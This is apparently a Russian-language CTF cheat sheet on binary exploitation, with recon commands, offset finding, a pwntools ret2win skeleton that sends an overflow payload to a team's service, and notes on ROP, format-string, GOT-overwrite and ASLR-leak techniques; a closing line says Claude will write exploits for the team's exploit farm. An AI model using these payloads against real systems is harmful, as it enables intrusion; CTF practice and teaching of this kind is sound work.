# 04 — PWN (бинарные эксплойты)

Сложнее веба, но многое — по шаблону. Нужен pwntools (`pip install pwntools`).
Орги обычно дают сам бинарь сервиса — качай его к себе.

## Разведка бинаря
```bash
file ./service
checksec ./service          # что включено: NX / PIE / Canary / RELRO
strings ./service | grep -iE 'flag|/bin/sh|system'
nm ./service | grep -i 'win\|flag\|system'   # есть ли готовая win-функция
```

## Подключиться и пощупать руками
```bash
nc TEAM PORT
# смотри меню/формат ввода. Часто флаг в /flag или читается командой сервиса.
```

## Найти смещение до перезаписи (offset)
```bash
# сгенерить паттерн, скормить, по значению EIP/RIP найти offset
cyclic 200                              # pwntools: печатает паттерн
# после креша в gdb:   cyclic -l 0xПЕРЕЗАПИСАННОЕ_ЗНАЧЕНИЕ
```

## Скелет pwntools (положить в exploits/pwn_svc.py)
```python
#!/usr/bin/env python3
import sys
from pwn import *
context.log_level = "error"
HOST = sys.argv[1]; PORT = 9999          # TODO порт
elf = ELF("./service", checksec=False)   # локальная копия бинаря

io = remote(HOST, PORT)

# --- ret2win (самый частый лёгкий кейс) ---
offset = 40                              # TODO найденный offset
payload  = b"A"*offset
payload += p64(elf.sym["win"])           # TODO адрес нужной функции
io.sendline(payload)

# прочитать флаг из вывода
io.recvuntil(b"flag", timeout=3)
print(io.recvall(timeout=3).decode(errors="replace"))
```

## Частые приёмы (чем ломать)
- **ret2win** — в бинаре есть функция, печатающая флаг → перезаписать адрес возврата на неё.
- **ret2libc / system("/bin/sh")** — если NX включён; через ROP вызвать `system`.
- **Format string** — `%p %p %p` утекают стек; `%n` пишет в память.
- **GOT overwrite** — перезаписать указатель в GOT на `system`.
- **Утечка (leak) → ASLR** — сначала слить адрес, пересчитать базу libc, потом бить.

## ROP по-быстрому
```bash
ROPgadget --binary ./service | grep 'pop rdi'      # нужные гаджеты
one_gadget ./libc.so.6                              # готовый адрес для shell
```

## Если сложно — главный лайфхак
Скинь мне (Claude) бинарь/исходник и вывод `checksec` + `file` — я напишу эксплойт
под контракт фермы (`print` флага), ты просто положишь его в `exploits/`.
